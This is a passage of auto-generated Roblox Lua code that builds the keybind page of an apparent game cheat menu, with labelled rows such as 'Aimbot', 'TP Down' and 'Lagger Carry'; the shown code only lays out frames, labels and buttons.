G.UIPadding_5.Parent = G.Page5

-- Frame_141 (Frame)
G.Frame_141 = Instance.new("Frame")
G.Frame_141.BackgroundTransparency = 1
G.Frame_141.BorderSizePixel = 0
G.Frame_141.LayoutOrder = 13
G.Frame_141.Size = UDim2.new(1, 0, 0, 38)
G.Frame_141.Parent = G.Page5

-- TextLabel_88 (TextLabel)
G.TextLabel_88 = Instance.new("TextLabel")
G.TextLabel_88.BackgroundTransparency = 1
G.TextLabel_88.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_88.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_88.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_88.Text = "KEYBINDS"
G.TextLabel_88.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_88.TextSize = 15
G.TextLabel_88.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_88.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_88.Parent = G.Frame_141

-- Frame_142 (Frame)
G.Frame_142 = Instance.new("Frame")
G.Frame_142.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_142.BackgroundTransparency = 0.34999999403953552
G.Frame_142.BorderSizePixel = 0
G.Frame_142.Position = UDim2.new(0, 8, 1, -4)
G.Frame_142.Size = UDim2.new(1, -16, 0, 2)
G.Frame_142.Parent = G.Frame_141

-- Frame_143 (Frame)
G.Frame_143 = Instance.new("Frame")
G.Frame_143.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_143.BorderSizePixel = 0
G.Frame_143.ClipsDescendants = true
G.Frame_143.LayoutOrder = 14
G.Frame_143.Size = UDim2.new(1, 0, 0, 32)
G.Frame_143.Parent = G.Page5

-- UICorner_165 (UICorner)
G.UICorner_165 = Instance.new("UICorner")
G.UICorner_165.CornerRadius = UDim.new(0, 14)
G.UICorner_165.Parent = G.Frame_143

-- UIStroke_83 (UIStroke)
G.UIStroke_83 = Instance.new("UIStroke")
G.UIStroke_83.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_83.Parent = G.Frame_143

-- TextLabel_89 (TextLabel)
G.TextLabel_89 = Instance.new("TextLabel")
G.TextLabel_89.BackgroundTransparency = 1
G.TextLabel_89.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_89.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_89.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_89.Text = "Auto Left"
G.TextLabel_89.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_89.TextSize = 14
G.TextLabel_89.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_89.Parent = G.Frame_143

-- ClearKB (TextButton)
G.ClearKB = Instance.new("TextButton")
G.ClearKB.Name = "ClearKB"
G.ClearKB.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB.BorderSizePixel = 0
G.ClearKB.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB.ZIndex = 6
G.ClearKB.AutoButtonColor = false
G.ClearKB.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB.Text = "X"
G.ClearKB.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB.TextSize = 10
G.ClearKB:SetAttribute("PrintedSoundWired", true)
G.ClearKB.Parent = G.Frame_143

-- UICorner_166 (UICorner)
G.UICorner_166 = Instance.new("UICorner")
G.UICorner_166.CornerRadius = UDim.new(1, 0)
G.UICorner_166.Parent = G.ClearKB

-- TextButton_47 (TextButton)
G.TextButton_47 = Instance.new("TextButton")
G.TextButton_47.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_47.BorderSizePixel = 0
G.TextButton_47.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_47.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_47.ZIndex = 5
G.TextButton_47.AutoButtonColor = false
G.TextButton_47.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_47.Text = "Z"
G.TextButton_47.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_47:SetAttribute("PrintedSoundWired", true)
G.TextButton_47.Parent = G.Frame_143

-- UICorner_167 (UICorner)
G.UICorner_167 = Instance.new("UICorner")
G.UICorner_167.CornerRadius = UDim.new(1, 0)
G.UICorner_167.Parent = G.TextButton_47

-- Frame_144 (Frame)
G.Frame_144 = Instance.new("Frame")
G.Frame_144.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_144.BorderSizePixel = 0
G.Frame_144.ClipsDescendants = true
G.Frame_144.LayoutOrder = 15
G.Frame_144.Size = UDim2.new(1, 0, 0, 32)
G.Frame_144.Parent = G.Page5

-- UICorner_168 (UICorner)
G.UICorner_168 = Instance.new("UICorner")
G.UICorner_168.CornerRadius = UDim.new(0, 14)
G.UICorner_168.Parent = G.Frame_144

-- UIStroke_84 (UIStroke)
G.UIStroke_84 = Instance.new("UIStroke")
G.UIStroke_84.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_84.Parent = G.Frame_144

-- TextLabel_90 (TextLabel)
G.TextLabel_90 = Instance.new("TextLabel")
G.TextLabel_90.BackgroundTransparency = 1
G.TextLabel_90.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_90.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_90.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_90.Text = "Auto Right"
G.TextLabel_90.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_90.TextSize = 14
G.TextLabel_90.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_90.Parent = G.Frame_144

-- ClearKB_2 (TextButton)
G.ClearKB_2 = Instance.new("TextButton")
G.ClearKB_2.Name = "ClearKB"
G.ClearKB_2.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_2.BorderSizePixel = 0
G.ClearKB_2.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_2.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_2.ZIndex = 6
G.ClearKB_2.AutoButtonColor = false
G.ClearKB_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_2.Text = "X"
G.ClearKB_2.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_2.TextSize = 10
G.ClearKB_2:SetAttribute("PrintedSoundWired", true)
G.ClearKB_2.Parent = G.Frame_144

-- UICorner_169 (UICorner)
G.UICorner_169 = Instance.new("UICorner")
G.UICorner_169.CornerRadius = UDim.new(1, 0)
G.UICorner_169.Parent = G.ClearKB_2

-- TextButton_48 (TextButton)
G.TextButton_48 = Instance.new("TextButton")
G.TextButton_48.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_48.BorderSizePixel = 0
G.TextButton_48.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_48.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_48.ZIndex = 5
G.TextButton_48.AutoButtonColor = false
G.TextButton_48.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_48.Text = "C"
G.TextButton_48.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_48:SetAttribute("PrintedSoundWired", true)
G.TextButton_48.Parent = G.Frame_144

-- UICorner_170 (UICorner)
G.UICorner_170 = Instance.new("UICorner")
G.UICorner_170.CornerRadius = UDim.new(1, 0)
G.UICorner_170.Parent = G.TextButton_48

-- Frame_145 (Frame)
G.Frame_145 = Instance.new("Frame")
G.Frame_145.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_145.BorderSizePixel = 0
G.Frame_145.ClipsDescendants = true
G.Frame_145.LayoutOrder = 16
G.Frame_145.Size = UDim2.new(1, 0, 0, 32)
G.Frame_145.Parent = G.Page5

-- UICorner_171 (UICorner)
G.UICorner_171 = Instance.new("UICorner")
G.UICorner_171.CornerRadius = UDim.new(0, 14)
G.UICorner_171.Parent = G.Frame_145

-- UIStroke_85 (UIStroke)
G.UIStroke_85 = Instance.new("UIStroke")
G.UIStroke_85.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_85.Parent = G.Frame_145

-- TextLabel_91 (TextLabel)
G.TextLabel_91 = Instance.new("TextLabel")
G.TextLabel_91.BackgroundTransparency = 1
G.TextLabel_91.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_91.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_91.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_91.Text = "Aimbot"
G.TextLabel_91.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_91.TextSize = 14
G.TextLabel_91.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_91.Parent = G.Frame_145

-- ClearKB_3 (TextButton)
G.ClearKB_3 = Instance.new("TextButton")
G.ClearKB_3.Name = "ClearKB"
G.ClearKB_3.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_3.BorderSizePixel = 0
G.ClearKB_3.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_3.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_3.ZIndex = 6
G.ClearKB_3.AutoButtonColor = false
G.ClearKB_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_3.Text = "X"
G.ClearKB_3.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_3.TextSize = 10
G.ClearKB_3:SetAttribute("PrintedSoundWired", true)
G.ClearKB_3.Parent = G.Frame_145

-- UICorner_172 (UICorner)
G.UICorner_172 = Instance.new("UICorner")
G.UICorner_172.CornerRadius = UDim.new(1, 0)
G.UICorner_172.Parent = G.ClearKB_3

-- TextButton_49 (TextButton)
G.TextButton_49 = Instance.new("TextButton")
G.TextButton_49.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_49.BorderSizePixel = 0
G.TextButton_49.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_49.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_49.ZIndex = 5
G.TextButton_49.AutoButtonColor = false
G.TextButton_49.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_49.Text = "E"
G.TextButton_49.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_49:SetAttribute("PrintedSoundWired", true)
G.TextButton_49.Parent = G.Frame_145

-- UICorner_173 (UICorner)
G.UICorner_173 = Instance.new("UICorner")
G.UICorner_173.CornerRadius = UDim.new(1, 0)
G.UICorner_173.Parent = G.TextButton_49

-- Frame_146 (Frame)
G.Frame_146 = Instance.new("Frame")
G.Frame_146.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_146.BorderSizePixel = 0
G.Frame_146.ClipsDescendants = true
G.Frame_146.LayoutOrder = 17
G.Frame_146.Size = UDim2.new(1, 0, 0, 32)
G.Frame_146.Parent = G.Page5

-- UICorner_174 (UICorner)
G.UICorner_174 = Instance.new("UICorner")
G.UICorner_174.CornerRadius = UDim.new(0, 14)
G.UICorner_174.Parent = G.Frame_146

-- UIStroke_86 (UIStroke)
G.UIStroke_86 = Instance.new("UIStroke")
G.UIStroke_86.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_86.Parent = G.Frame_146

-- TextLabel_92 (TextLabel)
G.TextLabel_92 = Instance.new("TextLabel")
G.TextLabel_92.BackgroundTransparency = 1
G.TextLabel_92.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_92.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_92.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_92.Text = "Carry"
G.TextLabel_92.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_92.TextSize = 14
G.TextLabel_92.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_92.Parent = G.Frame_146

-- ClearKB_4 (TextButton)
G.ClearKB_4 = Instance.new("TextButton")
G.ClearKB_4.Name = "ClearKB"
G.ClearKB_4.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_4.BorderSizePixel = 0
G.ClearKB_4.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_4.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_4.ZIndex = 6
G.ClearKB_4.AutoButtonColor = false
G.ClearKB_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_4.Text = "X"
G.ClearKB_4.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_4.TextSize = 10
G.ClearKB_4:SetAttribute("PrintedSoundWired", true)
G.ClearKB_4.Parent = G.Frame_146

-- UICorner_175 (UICorner)
G.UICorner_175 = Instance.new("UICorner")
G.UICorner_175.CornerRadius = UDim.new(1, 0)
G.UICorner_175.Parent = G.ClearKB_4

-- TextButton_50 (TextButton)
G.TextButton_50 = Instance.new("TextButton")
G.TextButton_50.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_50.BorderSizePixel = 0
G.TextButton_50.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_50.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_50.ZIndex = 5
G.TextButton_50.AutoButtonColor = false
G.TextButton_50.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_50.Text = "Q"
G.TextButton_50.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_50:SetAttribute("PrintedSoundWired", true)
G.TextButton_50.Parent = G.Frame_146

-- UICorner_176 (UICorner)
G.UICorner_176 = Instance.new("UICorner")
G.UICorner_176.CornerRadius = UDim.new(1, 0)
G.UICorner_176.Parent = G.TextButton_50

-- Frame_147 (Frame)
G.Frame_147 = Instance.new("Frame")
G.Frame_147.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_147.BorderSizePixel = 0
G.Frame_147.ClipsDescendants = true
G.Frame_147.LayoutOrder = 18
G.Frame_147.Size = UDim2.new(1, 0, 0, 32)
G.Frame_147.Parent = G.Page5

-- UICorner_177 (UICorner)
G.UICorner_177 = Instance.new("UICorner")
G.UICorner_177.CornerRadius = UDim.new(0, 14)
G.UICorner_177.Parent = G.Frame_147

-- UIStroke_87 (UIStroke)
G.UIStroke_87 = Instance.new("UIStroke")
G.UIStroke_87.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_87.Parent = G.Frame_147

-- TextLabel_93 (TextLabel)
G.TextLabel_93 = Instance.new("TextLabel")
G.TextLabel_93.BackgroundTransparency = 1
G.TextLabel_93.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_93.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_93.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_93.Text = "Drop Brainrot"
G.TextLabel_93.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_93.TextSize = 14
G.TextLabel_93.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_93.Parent = G.Frame_147

-- ClearKB_5 (TextButton)
G.ClearKB_5 = Instance.new("TextButton")
G.ClearKB_5.Name = "ClearKB"
G.ClearKB_5.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_5.BorderSizePixel = 0
G.ClearKB_5.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_5.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_5.ZIndex = 6
G.ClearKB_5.AutoButtonColor = false
G.ClearKB_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_5.Text = "X"
G.ClearKB_5.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_5.TextSize = 10
G.ClearKB_5:SetAttribute("PrintedSoundWired", true)
G.ClearKB_5.Parent = G.Frame_147

-- UICorner_178 (UICorner)
G.UICorner_178 = Instance.new("UICorner")
G.UICorner_178.CornerRadius = UDim.new(1, 0)
G.UICorner_178.Parent = G.ClearKB_5

-- TextButton_51 (TextButton)
G.TextButton_51 = Instance.new("TextButton")
G.TextButton_51.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_51.BorderSizePixel = 0
G.TextButton_51.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_51.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_51.ZIndex = 5
G.TextButton_51.AutoButtonColor = false
G.TextButton_51.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_51.Text = "X"
G.TextButton_51.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_51:SetAttribute("PrintedSoundWired", true)
G.TextButton_51.Parent = G.Frame_147

-- UICorner_179 (UICorner)
G.UICorner_179 = Instance.new("UICorner")
G.UICorner_179.CornerRadius = UDim.new(1, 0)
G.UICorner_179.Parent = G.TextButton_51

-- Frame_148 (Frame)
G.Frame_148 = Instance.new("Frame")
G.Frame_148.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_148.BorderSizePixel = 0
G.Frame_148.ClipsDescendants = true
G.Frame_148.LayoutOrder = 19
G.Frame_148.Size = UDim2.new(1, 0, 0, 32)
G.Frame_148.Parent = G.Page5

-- UICorner_180 (UICorner)
G.UICorner_180 = Instance.new("UICorner")
G.UICorner_180.CornerRadius = UDim.new(0, 14)
G.UICorner_180.Parent = G.Frame_148

-- UIStroke_88 (UIStroke)
G.UIStroke_88 = Instance.new("UIStroke")
G.UIStroke_88.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_88.Parent = G.Frame_148

-- TextLabel_94 (TextLabel)
G.TextLabel_94 = Instance.new("TextLabel")
G.TextLabel_94.BackgroundTransparency = 1
G.TextLabel_94.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_94.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_94.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_94.Text = "TP Down"
G.TextLabel_94.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_94.TextSize = 14
G.TextLabel_94.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_94.Parent = G.Frame_148

-- ClearKB_6 (TextButton)
G.ClearKB_6 = Instance.new("TextButton")
G.ClearKB_6.Name = "ClearKB"
G.ClearKB_6.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_6.BorderSizePixel = 0
G.ClearKB_6.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_6.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_6.ZIndex = 6
G.ClearKB_6.AutoButtonColor = false
G.ClearKB_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_6.Text = "X"
G.ClearKB_6.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_6.TextSize = 10
G.ClearKB_6:SetAttribute("PrintedSoundWired", true)
G.ClearKB_6.Parent = G.Frame_148

-- UICorner_181 (UICorner)
G.UICorner_181 = Instance.new("UICorner")
G.UICorner_181.CornerRadius = UDim.new(1, 0)
G.UICorner_181.Parent = G.ClearKB_6

-- TextButton_52 (TextButton)
G.TextButton_52 = Instance.new("TextButton")
G.TextButton_52.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_52.BorderSizePixel = 0
G.TextButton_52.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_52.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_52.ZIndex = 5
G.TextButton_52.AutoButtonColor = false
G.TextButton_52.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_52.Text = "F"
G.TextButton_52.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_52:SetAttribute("PrintedSoundWired", true)
G.TextButton_52.Parent = G.Frame_148

-- UICorner_182 (UICorner)
G.UICorner_182 = Instance.new("UICorner")
G.UICorner_182.CornerRadius = UDim.new(1, 0)
G.UICorner_182.Parent = G.TextButton_52

-- Frame_149 (Frame)
G.Frame_149 = Instance.new("Frame")
G.Frame_149.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_149.BorderSizePixel = 0
G.Frame_149.ClipsDescendants = true
G.Frame_149.LayoutOrder = 20
G.Frame_149.Size = UDim2.new(1, 0, 0, 32)
G.Frame_149.Parent = G.Page5

-- UICorner_183 (UICorner)
G.UICorner_183 = Instance.new("UICorner")
G.UICorner_183.CornerRadius = UDim.new(0, 14)
G.UICorner_183.Parent = G.Frame_149

-- UIStroke_89 (UIStroke)
G.UIStroke_89 = Instance.new("UIStroke")
G.UIStroke_89.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_89.Parent = G.Frame_149

-- TextLabel_95 (TextLabel)
G.TextLabel_95 = Instance.new("TextLabel")
G.TextLabel_95.BackgroundTransparency = 1
G.TextLabel_95.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_95.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_95.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_95.Text = "Lagger Carry"
G.TextLabel_95.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_95.TextSize = 14
G.TextLabel_95.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_95.Parent = G.Frame_149

-- ClearKB_7 (TextButton)
G.ClearKB_7 = Instance.new("TextButton")
G.ClearKB_7.Name = "ClearKB"
G.ClearKB_7.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_7.BorderSizePixel = 0
G.ClearKB_7.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_7.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_7.ZIndex = 6
G.ClearKB_7.AutoButtonColor = false
G.ClearKB_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_7.Text = "X"
G.ClearKB_7.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_7.TextSize = 10
G.ClearKB_7:SetAttribute("PrintedSoundWired", true)
G.ClearKB_7.Parent = G.Frame_149

-- UICorner_184 (UICorner)
G.UICorner_184 = Instance.new("UICorner")
G.UICorner_184.CornerRadius = UDim.new(1, 0)
G.UICorner_184.Parent = G.ClearKB_7

-- TextButton_53 (TextButton)
G.TextButton_53 = Instance.new("TextButton")
G.TextButton_53.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_53.BorderSizePixel = 0
G.TextButton_53.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_53.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_53.ZIndex = 5
G.TextButton_53.AutoButtonColor = false
G.TextButton_53.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_53.Text = "R"
G.TextButton_53.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_53:SetAttribute("PrintedSoundWired", true)
G.TextButton_53.Parent = G.Frame_149

-- UICorner_185 (UICorner)
G.UICorner_185 = Instance.new("UICorner")
G.UICorner_185.CornerRadius = UDim.new(1, 0)
G.UICorner_185.Parent = G.TextButton_53

-- Frame_150 (Frame)
G.Frame_150 = Instance.new("Frame")
G.Frame_150.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_150.BorderSizePixel = 0
G.Frame_150.ClipsDescendants = true
G.Frame_150.LayoutOrder = 21
G.Frame_150.Size = UDim2.new(1, 0, 0, 32)
G.Frame_150.Parent = G.Page5

-- UICorner_186 (UICorner)
G.UICorner_186 = Instance.new("UICorner")
G.UICorner_186.CornerRadius = UDim.new(0, 14)
G.UICorner_186.Parent = G.Frame_150

-- UIStroke_90 (UIStroke)
G.UIStroke_90 = Instance.new("UIStroke")
G.UIStroke_90.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_90.Parent = G.Frame_150

-- TextLabel_96 (TextLabel)
G.TextLabel_96 = Instance.new("TextLabel")
G.TextLabel_96.BackgroundTransparency = 1
G.TextLabel_96.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_96.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_96.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_96.Text = "Lagger Normal"
G.TextLabel_96.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_96.TextSize = 14
G.TextLabel_96.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_96.Parent = G.Frame_150

-- ClearKB_8 (TextButton)
G.ClearKB_8 = Instance.new("TextButton")
G.ClearKB_8.Name = "ClearKB"
G.ClearKB_8.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_8.BorderSizePixel = 0
G.ClearKB_8.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_8.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_8.ZIndex = 6
G.ClearKB_8.AutoButtonColor = false
G.ClearKB_8.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_8.Text = "X"
G.ClearKB_8.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_8.TextSize = 10
G.ClearKB_8:SetAttribute("PrintedSoundWired", true)
G.ClearKB_8.Parent = G.Frame_150

-- UICorner_187 (UICorner)
G.UICorner_187 = Instance.new("UICorner")
G.UICorner_187.CornerRadius = UDim.new(1, 0)
G.UICorner_187.Parent = G.ClearKB_8

-- TextButton_54 (TextButton)
G.TextButton_54 = Instance.new("TextButton")
G.TextButton_54.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_54.BorderSizePixel = 0
G.TextButton_54.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_54.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_54.ZIndex = 5
G.TextButton_54.AutoButtonColor = false
G.TextButton_54.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_54.Text = "T"
G.TextButton_54.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_54:SetAttribute("PrintedSoundWired", true)
G.TextButton_54.Parent = G.Frame_150

-- UICorner_188 (UICorner)
G.UICorner_188 = Instance.new("UICorner")
G.UICorner_188.CornerRadius = UDim.new(1, 0)
G.UICorner_188.Parent = G.TextButton_54

-- Frame_151 (Frame)
G.Frame_151 = Instance.new("Frame")
G.Frame_151.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_151.BorderSizePixel = 0
G.Frame_151.ClipsDescendants = true
G.Frame_151.LayoutOrder = 22
G.Frame_151.Size = UDim2.new(1, 0, 0, 32)
G.Frame_151.Parent = G.Page5

-- UICorner_189 (UICorner)
G.UICorner_189 = Instance.new("UICorner")
G.UICorner_189.CornerRadius = UDim.new(0, 14)
G.UICorner_189.Parent = G.Frame_151

-- UIStroke_91 (UIStroke)
G.UIStroke_91 = Instance.new("UIStroke")
G.UIStroke_91.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_91.Parent = G.Frame_151

-- TextLabel_97 (TextLabel)
G.TextLabel_97 = Instance.new("TextLabel")
G.TextLabel_97.BackgroundTransparency = 1
G.TextLabel_97.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_97.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_97.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_97.Text = "TP Bat"
G.TextLabel_97.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_97.TextSize = 14
G.TextLabel_97.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_97.Parent = G.Frame_151

-- ClearKB_9 (TextButton)
G.ClearKB_9 = Instance.new("TextButton")
G.ClearKB_9.Name = "ClearKB"
G.ClearKB_9.BackgroundColor3 = Color3.fromRGB(40, 14, 16)
G.ClearKB_9.BorderSizePixel = 0
G.ClearKB_9.Position = UDim2.new(1, -18, 0.5, -8)
G.ClearKB_9.Size = UDim2.new(0, 16, 0, 16)
G.ClearKB_9.ZIndex = 6
G.ClearKB_9.AutoButtonColor = false
